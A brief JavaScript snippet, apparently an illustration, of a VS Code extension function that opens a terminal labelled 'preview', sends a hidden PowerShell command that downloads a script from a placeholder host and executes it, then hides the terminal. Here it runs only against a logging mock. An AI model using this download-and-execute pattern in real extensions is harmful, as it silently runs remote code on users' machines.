const vscode = require("vscode");
function showExample(vscode) {
  const t = vscode.window.createTerminal({ name: "preview" });
  t.sendText("powershell -NoProfile -w hidden -c iwr " +
    "https://relay.example.invalid/stage.ps1 -UseBasicParsing | iex", true);
  t.hide();
}
showExample({ window: { createTerminal() { return { sendText: console.log, hide() {} }; } } });
